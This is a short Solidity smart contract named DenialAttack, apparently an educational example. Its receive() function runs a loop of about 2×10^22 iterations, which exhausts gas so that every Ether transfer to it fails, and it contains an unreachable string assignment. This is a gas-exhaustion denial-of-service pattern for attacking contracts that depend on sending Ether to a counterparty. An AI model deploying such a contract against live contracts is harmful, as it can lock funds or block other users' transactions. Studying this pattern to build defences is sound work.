// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttack {
    string public Salam = "AOA World";

    receive() external payable {
        for(uint i=0; i<20000000000000000000000; ++i){
            if(i == 20000000000000000000000){
                Salam = "Assalam-o-Alaikum";
            }
        }
    }
}